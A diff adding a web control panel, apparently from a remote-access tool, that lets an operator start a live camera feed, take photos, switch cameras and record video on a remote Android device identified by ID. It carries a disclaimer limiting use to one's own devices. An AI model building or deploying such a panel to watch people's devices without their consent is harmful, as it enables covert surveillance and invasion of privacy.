@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera - Remote Access</title>
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <style>
+        :root {
+            --font-display: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        /* ── PAGE HEADER ── */
+        .pg-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 24px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            margin-bottom: 20px;
+        }
+
+        .pg-header-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .pg-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.12), rgba(0, 255, 65, 0.03));
+            border: 1px solid rgba(0, 255, 65, 0.15);
+            color: var(--accent);
+            flex-shrink: 0;
+        }
+
+        .pg-title {
+            font-family: var(--font-display);
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .pg-sub {
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 400;
+            color: var(--text-muted);
+            margin-top: 2px;
+        }
+
+        .btn-back {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            background: transparent;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-family: var(--font-display);
+            font-size: 0.72rem;
+            font-weight: 500;
+            transition: all 0.2s;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-back:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        /* ── STATUS BAR ── */
+        .status-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 18px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+        }
+
+        .status-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 400;
+            color: var(--text-muted);
+        }
+
+        .status-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #444;
+            flex-shrink: 0;
+        }
+
+        .status-dot.active {
+            background: var(--accent);
+            box-shadow: 0 0 8px var(--accent-glow);
+            animation: pulse-dot 2s ease-in-out infinite;
+        }
+
+        .status-dot.recording {
+            background: #ff3333;
+            box-shadow: 0 0 8px rgba(255, 51, 51, 0.4);
+            animation: pulse-dot 1s ease-in-out infinite;
+        }
+
+        @keyframes pulse-dot {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.4;
+            }
+        }
+
+        .rec-timer {
+            display: none;
+            align-items: center;
+            gap: 6px;
+            font-family: var(--font-display);
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #ff3333;
+            letter-spacing: 1px;
+        }
+
+        .rec-timer .rec-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ff3333;
+            animation: pulse-dot 1s ease-in-out infinite;
+        }
+
+        /* ── CONTROLS ── */
+        .controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .ctrl-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            padding: 10px 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-family: var(--font-display);
+            font-size: 0.75rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: all 0.2s ease;
+            min-height: 42px;
+            white-space: nowrap;
+        }
+
+        .ctrl-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .ctrl-btn:active:not(:disabled) {
+            transform: scale(0.96);
+        }
+
+        .ctrl-btn.primary {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--accent);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+        }
+
+        .ctrl-btn.primary:hover:not(:disabled) {
+            background: rgba(0, 255, 65, 0.16);
+            border-color: rgba(0, 255, 65, 0.4);
+            box-shadow: 0 0 16px rgba(0, 255, 65, 0.1);
+        }
+
+        .ctrl-btn.secondary {
+            background: rgba(255, 255, 255, 0.03);
+            color: var(--text-primary);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .ctrl-btn.secondary:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.06);
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        .ctrl-btn.danger {
+            background: rgba(255, 51, 51, 0.08);
+            color: #ff3333;
+            border: 1px solid rgba(255, 51, 51, 0.15);
+        }
+
+        .ctrl-btn.danger:hover:not(:disabled) {
+            background: rgba(255, 51, 51, 0.14);
+            border-color: rgba(255, 51, 51, 0.3);
+            box-shadow: 0 0 16px rgba(255, 51, 51, 0.08);
+        }
+
+        .ctrl-btn.stop {
+            background: rgba(255, 51, 51, 0.12);
+            color: #ff3333;
+            border: 1px solid rgba(255, 51, 51, 0.25);
+        }
+
+        .ctrl-btn.stop:hover:not(:disabled) {
+            background: rgba(255, 51, 51, 0.2);
+            border-color: rgba(255, 51, 51, 0.4);
+            box-shadow: 0 0 20px rgba(255, 51, 51, 0.12);
+        }
+
+        /* ── CAMERA CONTAINER ── */
+        .camera-container {
+            background: #050a0e;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 0;
+            text-align: center;
+            min-height: 350px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .camera-container .placeholder {
+            font-family: var(--font-display);
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            font-weight: 400;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .camera-container .placeholder .ph-icon {
+            opacity: 0.3;
+            color: var(--accent);
+            animation: pulse-icon 2.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse-icon {
+
+            0%,
+            100% {
+                opacity: 0.2;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.45;
+                transform: scale(1.05);
+            }
+        }
+
+        .camera-container .placeholder h3 {
+            font-family: var(--font-display);
+            font-size: 1rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin: 0;
+        }
+
+        .camera-container .placeholder p {
+            font-size: 0.72rem;
+            margin: 0;
+            opacity: 0.5;
+        }
+
+        #camera-display {
+            max-width: 100%;
+            max-height: 70vh;
+            border-radius: 12px;
+            display: none;
+        }
+
+        /* ── DISCLAIMER ── */
+        .disc {
+            margin-top: 20px;
+            padding: 14px 18px;
+            background: rgba(255, 170, 0, 0.02);
+            border: 1px solid rgba(255, 170, 0, 0.08);
+            border-radius: 10px;
+        }
+
+        .disc h4 {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 500;
+            color: var(--warning);
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin: 0 0 6px;
+        }
+
+        .disc p {
+            font-family: var(--font-display);
+            font-size: 0.58rem;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.2);
+            line-height: 1.7;
+            margin: 0;
+        }
+
+        /* ── FOOTER ── */
+        .ft {
+            text-align: center;
+            padding: 30px 16px;
+            margin-top: 20px;
+        }
+
+        .ft .ft-label {
+            font-family: var(--font-display);
+            font-size: 0.5rem;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.18);
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+
+        .ft .ft-brand {
+            display: inline-block;
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: lowercase;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--accent), #00e5ff, var(--accent));
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 6px rgba(0, 255, 65, 0.15));
+        }
+
+        .ft .ft-copy {
+            font-family: var(--font-display);
+            font-size: 0.48rem;
+            font-weight: 400;
+            color: rgba(255, 255, 255, 0.12);
+            margin-top: 4px;
+            letter-spacing: 1px;
+        }
+
+        /* ── RESPONSIVE ── */
+        @media (max-width: 600px) {
+            .pg-header {
+                padding: 14px 16px;
+            }
+
+            .pg-title {
+                font-size: 1rem;
+            }
+
+            .pg-sub {
+                display: none;
+            }
+
+            .btn-back span {
+                display: none;
+            }
+
+            .controls {
+                gap: 6px;
+            }
+
+            .ctrl-btn {
+                padding: 8px 12px;
+                font-size: 0.7rem;
+            }
+
+            .camera-container {
+                min-height: 250px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="pg-header">
+            <div class="pg-header-left">
+                <div class="pg-icon">
+                    <i data-lucide="camera" style="width:20px;height:20px;"></i>
+                </div>
+                <div>
+                    <div class="pg-title">Camera Control</div>
+                    <div class="pg-sub">// live preview &middot; capture &middot; record</div>
+                </div>
+            </div>
+            <a href="javascript:window.history.back()" class="btn-back">
+                <i data-lucide="arrow-left" style="width:14px;height:14px;"></i>
+                <span>Back</span>
+            </a>
+        </div>
+
+        <!-- Status Bar -->
+        <div class="status-bar">
+            <div class="status-left">
+                <div class="status-dot" id="status-dot"></div>
+                <span id="status-indicator">IDLE</span>
+            </div>
+            <div class="rec-timer" id="rec-timer">
+                <span class="rec-dot"></span>
+                <span id="rec-time">00:00</span>
+            </div>
+        </div>
+
+        <!-- Controls -->
+        <div class="controls">
+            <button class="ctrl-btn primary" id="btn-start-preview">
+                <i data-lucide="play" style="width:14px;height:14px;"></i> START PREVIEW
+            </button>
+            <button class="ctrl-btn stop" id="btn-stop-preview" style="display: none;">
+                <i data-lucide="square" style="width:14px;height:14px;"></i> STOP PREVIEW
+            </button>
+            <button class="ctrl-btn primary" id="btn-photo">
+                <i data-lucide="aperture" style="width:14px;height:14px;"></i> PHOTO
+            </button>
+            <button class="ctrl-btn secondary" id="btn-switch">
+                <i data-lucide="refresh-cw" style="width:14px;height:14px;"></i> SWITCH
+            </button>
+            <button class="ctrl-btn danger" id="btn-start-record">
+                <i data-lucide="circle" style="width:14px;height:14px;"></i> RECORD
+            </button>
+            <button class="ctrl-btn stop" id="btn-stop-record" style="display: none;">
+                <i data-lucide="square" style="width:14px;height:14px;"></i> STOP REC
+            </button>
+        </div>
+
+        <!-- Camera Feed -->
+        <div class="camera-container">
+            <div id="placeholder" class="placeholder">
+                <div class="ph-icon">
+                    <i data-lucide="video" style="width:48px;height:48px;"></i>
+                </div>
+                <h3>Camera Preview</h3>
+                <p>Start preview to view camera feed</p>
+            </div>
+            <img id="camera-display" style="display: none;" />
+        </div>
+
+        <!-- Disclaimer -->
+        <div class="disc">
+            <h4><i data-lucide="alert-triangle" style="width:12px;height:12px;"></i> Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely
+                manage their own devices. Installing or using this on a device without the owner's explicit consent is
+                illegal and unethical.</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="ft">
+        <div class="ft-label">crafted by</div>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="ft-brand">thiyo-de</a>
+        <div class="ft-copy">&copy; 2025 &middot; all rights reserved</div>
+    </footer>
+
+    <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
+    <script>
+        lucide.createIcons();
+
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        const imgDisplay = document.getElementById('camera-display');
+        const placeholder = document.getElementById('placeholder');
+        const statusIndicator = document.getElementById('status-indicator');
+        const statusDot = document.getElementById('status-dot');
+
+        // Buttons
+        const btnStartPreview = document.getElementById('btn-start-preview');
+        const btnStopPreview = document.getElementById('btn-stop-preview');
+        const btnPhoto = document.getElementById('btn-photo');
+        const btnSwitch = document.getElementById('btn-switch');
+        const btnStartRecord = document.getElementById('btn-start-record');
+        const btnStopRecord = document.getElementById('btn-stop-record');
+
+        if (!deviceId) {
+            window.location.href = 'index.html';
+        }
+
+        // State Machine
+        const STATES = { IDLE: 'IDLE', PREVIEWING: 'PREVIEWING', RECORDING: 'RECORDING' };
+        let currentState = STATES.IDLE;
+        let recStartTime = null;
+        let recTimerInterval = null;
+
+        function startRecTimer() {
+            recStartTime = Date.now();
+            document.getElementById('rec-timer').style.display = 'inline-flex';
+            recTimerInterval = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - recStartTime) / 1000);
+                const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
+                const s = String(elapsed % 60).padStart(2, '0');
+                document.getElementById('rec-time').textContent = `${m}:${s}`;
+            }, 1000);
+        }
+
+        function stopRecTimer() {
+            clearInterval(recTimerInterval);
+            recTimerInterval = null;
+            document.getElementById('rec-timer').style.display = 'none';
+            document.getElementById('rec-time').textContent = '00:00';
+        }
+
+        function updateUI(state) {
+            currentState = state;
+            statusIndicator.textContent = state;
+
+            const show = (el) => { el.style.display = 'inline-flex'; el.disabled = false; el.style.opacity = '1'; };
+            const hide = (el) => el.style.display = 'none';
+            const disable = (el) => { el.style.display = 'inline-flex'; el.disabled = true; el.style.opacity = '0.5'; };
+
+            // Reset status dot
+            statusDot.className = 'status-dot';
+
+            switch (state) {
+                case STATES.IDLE:
+                    show(btnStartPreview);
+                    hide(btnStopPreview);
+                    disable(btnStartRecord);
+                    hide(btnStopRecord);
+                    disable(btnPhoto);
+                    disable(btnSwitch);
+                    hide(imgDisplay);
+                    placeholder.style.display = 'flex';
+                    placeholder.style.position = '';
+                    placeholder.style.background = '';
+                    placeholder.innerHTML = '<div class="ph-icon"><i data-lucide="video" style="width:48px;height:48px;"></i></div><h3>Camera Preview</h3><p>Start preview to view camera feed</p>';
+                    lucide.createIcons();
+                    break;
+
+                case STATES.PREVIEWING:
+                    hide(btnStartPreview);
+                    show(btnStopPreview);
+                    show(btnStartRecord);
+                    hide(btnStopRecord);
+                    show(btnPhoto);
+                    show(btnSwitch);
+                    show(imgDisplay);
+                    placeholder.style.display = 'none';
+                    statusDot.classList.add('active');
+                    break;
+
+                case STATES.RECORDING:
+                    hide(btnStartPreview);
+                    hide(btnStopPreview);
+                    hide(btnStartRecord);
+                    show(btnStopRecord);
+                    disable(btnPhoto);
+                    hide(btnSwitch);
+                    show(imgDisplay);
+                    placeholder.style.display = 'flex';
+                    placeholder.style.position = 'absolute';
+                    placeholder.style.top = '12px';
+                    placeholder.style.left = '50%';
+                    placeholder.style.transform = 'translateX(-50%)';
+                    placeholder.style.zIndex = '100';
+                    placeholder.style.background = 'transparent';
+                    placeholder.style.padding = '0';
+                    placeholder.innerHTML = '<div style="background:rgba(255,0,0,0.7);color:#fff;padding:8px 16px;border-radius:8px;font-family:var(--font-display);font-size:0.72rem;font-weight:600;display:flex;align-items:center;gap:6px;letter-spacing:1px;"><i data-lucide="circle" style="width:10px;height:10px;fill:#fff;"></i> REC</div>';
+                    lucide.createIcons();
+                    statusDot.classList.add('recording');
+                    startRecTimer();
+                    break;
+            }
+        }
+
+        // --- PREVIEW ---
+        async function startPreview() {
+            try {
+                updateUI(STATES.PREVIEWING);
+                await api.sendCommand(deviceId, 'camera_stream_start');
+                api.showToast('Camera preview started', 'success');
+            } catch (error) {
+                console.error(error);
+                api.showToast('Failed to start preview: ' + error.message, 'error');
+                updateUI(STATES.IDLE);
+            }
+        }
+
+        async function stopPreview() {
+            try {
+                await api.sendCommand(deviceId, 'camera_stream_stop');
+                updateUI(STATES.IDLE);
+                api.showToast('Camera preview stopped', 'success');
+            } catch (error) {
+                console.error(error);
+                api.showToast('Failed to stop preview: ' + error.message, 'error');
+            }
+        }
+
+        function prettifyPath(path) {
+            if (!path) return 'Downloads/RemoteAccess';
+            return path.replace('/storage/emulated/0/', '');
+        }
+
+        let lastRecordingPath = '';
+
+        // --- PHOTO ---
+        async function takePhoto() {
+            if (!window.api) return;
+            try {
+                const response = await window.api.sendCommand(deviceId, 'camera_snap');
+                const result = response.data || response;
+                if (result.path || result.displayPath) {
+                    const displayPath = result.displayPath || prettifyPath(result.path);
+                    window.api.showToast(`Photo saved to: ${displayPath}`, 'success');
+                }
+            } catch (error) {
+                window.api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        // --- SWITCH ---
+        async function switchCamera() {
+            if (!window.api) return;
+            try {
+                await window.api.sendCommand(deviceId, 'camera_switch');
+                window.api.showToast('Camera switched', 'success');
+            } catch (error) {
+                window.api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        // --- RECORDING ---
+        async function startRecording() {
+            if (!window.api) return;
+            try {
+                updateUI(STATES.RECORDING);
+                const response = await window.api.sendCommand(deviceId, 'camera_record_start');
+                const result = response.data || response;
+                if (result && result.path) lastRecordingPath = result.path;
+                window.api.showToast('Recording started', 'success');
+            } catch (error) {
+                console.error(error);
+                window.api.showToast('Failed to start recording: ' + error.message, 'error');
+                updateUI(STATES.IDLE);
+            }
+        }
+
+        async function stopRecording() {
+            if (!window.api) return;
+            try {
+                await window.api.sendCommand(deviceId, 'camera_record_stop');
+                stopRecTimer();
+                updateUI(STATES.PREVIEWING);
+                const displayPath = prettifyPath(lastRecordingPath);
+                window.api.showToast(`Recording saved to: ${displayPath}`, 'success');
+            } catch (error) {
+                console.error(error);
+                window.api.showToast('Failed to stop recording: ' + error.message, 'error');
+            }
+        }
+
+        // ===== Initialization & State Reconciliation =====
+        async function checkInitialStatus() {
+            try {
+                const response = await api.sendCommand(deviceId, 'camera_status');
+                const state = response.data || response;
+                
+                if (state.state === 'LIVE_PREVIEW' || state.state === 'RECORDING_VIDEO') {
+                    api.showToast('Resuming active camera session...', 'info');
+                    updateUI(state.state === 'RECORDING_VIDEO' ? STATES.RECORDING : STATES.PREVIEWING);
+                } else {
+                    updateUI(STATES.IDLE);
+                }
+            } catch (e) {
+                console.error("Failed to fetch camera status:", e);
+                updateUI(STATES.IDLE);
+            }
+        }
+        
+        checkInitialStatus();
+
+        // Event Listeners
+        btnStartPreview.addEventListener('click', startPreview);
+        btnStopPreview.addEventListener('click', stopPreview);
+        btnPhoto.addEventListener('click', takePhoto);
+        btnSwitch.addEventListener('click', switchCamera);
+        btnStartRecord.addEventListener('click', startRecording);
+        btnStopRecord.addEventListener('click', stopRecording);
+
+        // WebSocket for Camera Frames
+        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${wsProtocol}//${window.location.host}`;
+        const ws = new WebSocket(wsUrl);
+        ws.binaryType = 'arraybuffer';
+
+        ws.onopen = () => {
+            console.log('Camera WebSocket connected');
+            ws.send(JSON.stringify({ type: 'identify', deviceId: 'browser' }));
+        };
+
+        let _prevCamUrl = null;
+        ws.onmessage = (event) => {
+            try {
+                // Binary frame: [1 byte type] [N bytes payload]
+                if (event.data instanceof ArrayBuffer) {
+                    const view = new Uint8Array(event.data);
+                    if (view.length < 2) return;
+                    const type = view[0]; // 0x02 = camera
+                    if (type !== 0x02) return;
+
+                    if (currentState !== STATES.PREVIEWING && currentState !== STATES.RECORDING) return;
+
+                    const payload = view.slice(1);
+                    const blob = new Blob([payload], { type: 'image/jpeg' });
+                    const url = URL.createObjectURL(blob);
+                    if (_prevCamUrl) URL.revokeObjectURL(_prevCamUrl);
+                    _prevCamUrl = url;
+
+                    if (imgDisplay.style.display === 'none') {
+                        const label = currentState === STATES.RECORDING ? 'RECORDING' : 'PREVIEWING';
+                        statusIndicator.textContent = `${label} (Receiving Frames)`;
+                        imgDisplay.style.display = 'block';
+                    }
+                    imgDisplay.src = url;
+                    return;
+                }
+            } catch (e) { /* Ignore non-matching frames */ }
+        };
+
+        ws.onerror = (error) => { console.error('WebSocket error:', error); };
+
+        // ===== Page Leave Cleanup =====
+        function cleanupOnLeave() {
+            if (currentState !== STATES.IDLE) {
+                const action = currentState === STATES.RECORDING ? 'camera_record_stop' : 'camera_stream_stop';
+                const url = `/api/command/${deviceId}`;
+                const body = JSON.stringify({ action, payload: {} });
+                navigator.sendBeacon(url, new Blob([body], { type: 'application/json' }));
+                if (ws) { ws.close(); }
+            }
+        }
+        window.addEventListener('pagehide', cleanupOnLeave);
+        window.addEventListener('beforeunload', cleanupOnLeave);
+    </script>
+</body>
+
+</html>
